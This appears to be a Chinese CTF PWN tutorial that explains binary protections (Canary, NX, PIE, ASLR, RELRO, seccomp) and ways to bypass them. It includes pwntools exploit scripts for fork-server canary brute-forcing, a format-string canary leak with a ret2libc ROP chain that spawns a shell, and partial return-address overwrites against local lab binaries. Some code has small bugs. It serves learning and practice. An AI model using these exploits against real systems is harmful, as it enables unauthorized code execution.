# 保护机制与绕过：ASLR / PIE / NX / Canary / RELRO

## 1. 概述

现代二进制程序的多级保护机制是PWN利用的主要障碍。理解每层保护的工作原理及其绕过技术，是CTF PWN的核心能力。各保护机制并非孤立存在，有效的利用通常需要"组合拳"绕过多个保护。

在CTF断网离线场景下，需要根据checksec输出快速判断可利用的攻击面，并选择正确的绕过策略。

## 2. 核心原理

### 2.1 保护机制全景

```
编译时保护:
├── Canary (Stack Protector)     — 栈溢出检测
├── NX/DEP (No-eXecute)         — 栈/堆代码不可执行
├── PIE (Position Independent)   — 代码段随机化
├── RELRO (Relocation Read-Only) — GOT表保护
│   ├── No RELRO: GOT完全可写
│   ├── Partial RELRO: .got.plt可写，.got不可写
│   └── Full RELRO: 所有GOT不可写（初始化后只读）
├── FORTIFY_SOURCE              — 编译期check增强
└── Stack Protector (Cannary)   — 栈canary值检测

运行时保护:
├── ASLR (Address Space Layout Randomization) — 地址空间随机化
│   ├── 等级 0: 关闭
│   ├── 等级 1: 部分随机化 (mmap, stack)
│   └── 等级 2: 完全随机化 (含brk/heap)
└── seccomp (Sandbox)           — 系统调用限制
```

### 2.2 编译选项与保护对应

```bash
# GCC编译选项
gcc -fno-stack-protector   # 禁用Canary
gcc -no-pie                 # 禁用PIE（生成executable ELF）
gcc -z execstack            # 禁用NX (栈可执行)
gcc -z norelro              # 禁用RELRO
gcc -z lazy                 # Partial RELRO (延迟绑定)

# 全保护开启 (现代默认)
gcc -fstack-protector-strong -pie -z relro -z now -D_FORTIFY_SOURCE=2

# 全保护关闭 (简单题)
gcc -fno-stack-protector -no-pie -z execstack -z norelro
```

### 2.3 checksec 输出解读

```
$ checksec --file=./binary
Arch:     amd64-64-little
RELRO:    Full RELRO        <-- GOT表不可写，无法覆写GOT
Stack:    Canary found      <-- 需要泄露canary
NX:       NX enabled        <-- 不能ret2shellcode
PIE:      PIE enabled       <-- 代码段地址随机，需泄露基址
```

## 3. 关键技巧/检测方法

### 3.1 各保护的绕过技术速查

| 保护机制 | 绕过方法 | 难度 |
|---------|---------|------|
| **Canary** | 1. 格式化字符串/任意读泄露canary<br>2. 覆写__stack_chk_fail@GOT<br>3. 爆破（fork子进程中canary不变）<br>4. Thread Local Storage覆盖<br>5. SSP leak (通过报错信息) | 中 |
| **NX** | 1. ret2libc<br>2. ROP / SROP<br>3. mprotect + shellcode<br>4. JIT spraying (罕见) | 低 |
| **PIE** | 1. 部分写（partial overwrite低12位）<br>2. 格式化字符串泄露<br>3. 侧信道泄露<br>4. vsyscall (始终固定) | 中 |
| **ASLR** | 1. 泄露地址<br>2. 部分覆盖（低12位相对固定）<br>3. 内存喷射(heap spray)<br>4. 爆破(32位系统低熵) | 中 |
| **Full RELRO** | 1. __malloc_hook/__free_hook (如果可用)<br>2. IO_FILE / FSOP<br>3. _rtld_global / link_map劫持<br>4. 其他函数指针 | 高 |
| **FORTIFY** | 1. 避免触发源检查的函数<br>2. 精确控制参数<br>3. 使用无FORTIFY版本的函数 | 中 |
| **seccomp** | 1. ORW (open/read/write)<br>2. 符合白名单规则的system调用<br>3. retf切换到32位模式 | 高 |

### 3.3 Fork服务器Canary爆破

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
fork子进程中的Canary爆破 (x64)
fork后子进程共享父进程的内存映射(包括canary)
如果每个连接fork一次且不变，可逐字节爆破canary
"""
from pwn import *

def brute_canary_byte(p, known_bytes, offset):
    """
    爆破单个canary字节
    known_bytes: 已爆破的字节 (如 b'\\x00' 第一字节固定)
    offset: 到canary的填充长度
    """
    for guess in range(256):
        try:
            p = process('./fork_server')
            payload = b'A' * offset
            payload += known_bytes + bytes([guess])
            p.send(payload)
            response = p.recvrepeat(timeout=1)

            # 如果没有crash说明canary正确
            if b'Segmentation fault' not in response and len(response) > 0:
                log.success(f'Byte found: {hex(guess)}')
                p.close()
                return guess
        except:
            continue
        p.close()
    return None

def brute_canary_full(offset):
    """完整canary爆破"""
    known = b'\x00'  # x64 canary第一字节总是0x00
    for i in range(1, 8):  # 剩余7字节
        byte_val = brute_canary_byte(process, known, offset)
        if byte_val is None:
            log.error('Brute force failed')
            return None
        known += bytes([byte_val])
        log.info(f'Canary so far: {known.hex()}')
    return u64(known)
```

## 4. 常见误区与注意事项

1. **No RELRO不等于没保护**：仍有ASLR、PIE、Canary
2. **Canary != Stack Canary**：TCP canary, fork canary 各有特点
3. **Full RELRO + ASLR 不是终点**：libc中仍有可覆写的函数指针
4. **PIE开启时.text地址随机**：但vsyscall页始终在固定地址（新kernel可能也是随机的）
5. **32位ASLR脆弱**：仅8位随机(256种可能)，可爆破

## 5. 实战示例

### 5.1 Canary泄露 + ROP利用

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Canary绕过：通过格式化字符串泄露canary + ret2libc
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

p = process('./canary_vuln')
elf = ELF('./canary_vuln')
libc = ELF('./libc.so.6')

# ---- Step 1: 用格式化字符串泄露canary ----
# 假设程序中有 printf(buf) 漏洞
# 栈布局：buffer -> ... -> canary -> saved_rbp -> ret_addr
# 通过%p序列找到canary在栈上的位置

# 偏移探测
p.sendline(b'%p.' * 50)
leak_data = p.recvline().decode().strip().split('.')
for i, val in enumerate(leak_data):
    log.info(f'Offset {i}: {val}')
    # 找到末尾是00的canary值（如 0x5a173f2de6ab200）

# 假设偏移23是canary
p.sendline(b'%23$p')
canary_value = int(p.recvline().strip(), 16)
log.success(f'Leaked canary: {hex(canary_value)}')

# ---- Step 2: 泄露__libc_start_main返回地址 ----
p.sendline(b'%25$p')
libc_start_main_ret = int(p.recvline().strip(), 16)
libc_base = libc_start_main_ret - libc.symbols['__libc_start_main'] - 243
log.success(f'libc_base: {hex(libc_base)}')

# ---- Step 3: 构造ROP链 ----
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))
pop_rdi = libc_base + 0x2164f  # ROPgadget --binary libc.so.6
ret = 0x40101a

offset = 0x40  # 到canary的距离

payload = b'A' * offset
payload += p64(canary_value)   # 恢复原始canary
payload += p64(0)              # saved rbp (随意)
payload += p64(ret)            # 栈对齐
payload += p64(pop_rdi) + p64(bin_sh)
payload += p64(system)

p.sendlineafter(b'Input:', payload)
p.interactive()
```

### 5.2 Fork服务器Canary爆破+ROP

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Fork服务器Canary逐字节爆破
每个连接fork一个子进程处理，canary在所有子进程中不变
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'warn'

elf = ELF('./fork_server')

offset = 0x28  # 缓冲区到canary的距离

# ---- 爆破canary ----
canary = b'\x00'  # 第1字节固定0x00
log.info('Brute forcing canary...')

for i in range(1, 8):
    found = False
    for b in range(256):
        try:
            p = process('./fork_server')
            payload = b'A' * offset + canary + bytes([b])

            # 发送到溢出位置
            p.sendlineafter(b'Input size:', str(len(payload)).encode())
            p.sendafter(b'Data:', payload)

            # 等待响应或超时
            response = p.recvuntil(b'Bye!', timeout=3)
            p.close()

            # 没crash = canary字节正确
            canary += bytes([b])
            log.success(f'Canary byte {i}: {hex(b)} -> {canary.hex()}')
            found = True
            break
        except:
            try:
                p.close()
            except:
                pass

    if not found:
        log.error(f'Failed at byte {i}')
        break

log.success(f'Full canary: {canary.hex()} = {hex(u64(canary))}')
```

### 5.3 Partial RELRO GOT覆写绕过ASLR+PIE

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Partial RELRO + ASLR + PIE 组合绕过的典型流程
1. 部分覆写返回地址低字节 -> 跳过PIE
2. 泄露libc地址 -> 绕过ASLR
3. 覆写GOT表 -> 劫持函数
"""
from pwn import *

context.arch = 'amd64'

p = process('./partial_pie_aslr')
elf = ELF('./partial_pie_aslr')
libc = ELF('./libc.so.6')

# ---- 前提条件 ----
# checksec: Partial RELRO, Canary off, NX on, PIE on, ASLR on
# 漏洞: 栈溢出（仅有0x8字节溢出到返回地址）
# buf size = 0x30 -> offset = 0x30 + 8(saved rbp) = 0x38
# 溢出量 = 0x40 - 0x38 = 0x8 字节 -> 正好覆盖返回地址
# 实际只多了8字节到ret_addr

offset = 0x38

# ---- Step 1: 部分覆写返回地址低字节 ----
# 假设原始返回地址是 0x555555555234 (main+0x34)
# 目标: 跳转到 0x555555555200 (另一个有更多溢出机会的函数)
# PIE开启但低12位不变（页内偏移不变）
# 所以我们只需要覆盖最低1-2字节

target_func_low12 = 0x234  # 目标函数页内偏移
# 只需写入低字节

payload1 = b'A' * offset
payload1 += p8(target_func_low12 & 0xFF)  # 部分覆写(仅1字节)
# 如果目标偏移最低字节和当前一致，才有1/16概率成功（ASLR 4位随机）

p.sendafter(b'Name:', payload1)

# ---- Step 2: 使用puts泄露libc ----
# 目标函数有更大的溢出，现在可以做完整的ROP
# (以下假设已进入更大溢出的函数)

# 实际利用需要多次尝试（部分覆写有概率性）
# 更稳健的做法：先找到固定的vsyscall或非随机代码段
vsyscall = 0xffffffffff600000  # 旧kernel 固定地址
# gettimeofday 等函数在vsyscall页 = 0xffffffffff600000

p.interactive()
```
